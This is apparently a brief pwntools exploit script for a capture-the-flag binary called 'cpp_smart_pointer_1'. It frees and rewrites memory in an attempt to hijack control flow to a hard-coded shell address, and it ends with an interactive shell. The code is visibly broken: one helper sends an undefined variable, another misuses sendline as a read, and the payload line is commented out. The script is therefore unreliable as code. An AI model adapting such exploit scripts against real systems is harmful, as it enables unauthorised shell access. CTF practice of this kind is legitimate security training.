from pwn import *
def Delete(num):
	p.sendlineafter(': ', '2')
	p.sendlineafter(': ', str(num))
def Write(contents):
	p.sendlineafter(': ', data)
def View():
	p.recvuntil('data: ')
	return p.sendline().replace('\n', '') 
context.update(log_level='debug')

p = process('cpp_smart_pointer_1')

Delete(1)
Write('a'*7)
Write('a'*7)
addr_shell = 0x40161d
addr_s_shell = hex(addr_shell)[2:]
#p.sendline(addr_s_shell.encode('hex')[::-1] + '\x00'*(7 - len(addr_s_shell)))

p.interactive()

